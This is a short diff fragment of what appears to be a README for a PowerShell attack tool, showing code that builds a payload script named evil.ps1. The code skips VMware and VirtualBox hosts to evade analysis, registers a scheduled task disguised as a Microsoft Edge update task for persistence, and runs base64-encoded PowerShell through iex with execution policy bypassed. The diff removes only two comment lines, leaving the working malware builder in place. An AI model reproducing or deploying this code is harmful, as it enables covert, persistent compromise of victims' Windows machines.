@@ -122,7 +122,6 @@ $j = [PSCustomObject]@{
 $oneline = "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(('" + $j + "' | ConvertFrom-Json).Script)) | iex"
 $c = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($oneline))
 $template = '
-#check Anti vm (vmware \ virtual box)
 $VM=get-wmiobject win32_computersystem |select -ExpandProperty Model
 if(($VM -NotLike "*VMware*") -and ($VM -NotLike "VirtualBox")){
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument " -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded  "'+ $c + ' 
@@ -133,7 +132,6 @@ Register-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" -TaskPath "
 Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineUAS" 
 }
 '
-#Out-File -Encoding Default evil.ps1
 New-Item -Path . -Name evil.ps1 -Value $template </code></pre>
 <h2 id="operating-systems-tested">💻 Operating Systems Tested</h2>
 <ul>
